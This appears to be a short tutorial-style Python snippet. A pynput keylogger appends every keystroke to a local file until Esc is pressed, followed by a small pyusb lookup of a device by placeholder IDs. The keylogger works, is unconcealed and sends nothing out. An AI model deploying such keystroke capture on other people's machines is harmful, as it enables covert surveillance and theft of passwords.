from pynput import keyboard

def on_press(key):
    try:
        with open("keylog.txt", "a") as log_file:
            log_file.write('{0} pressed\n'.format(key))
    except Exception as e:
        print(f"Error: {e}")

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()


## Handling USB Events
import usb.core
import usb.util

# Find a specific USB device (e.g., by vendor and product ID)
dev = usb.core.find(idVendor=0x1234, idProduct=0x5678)

if dev is None:
    raise ValueError("Device not found")
else:
    print("Device found")
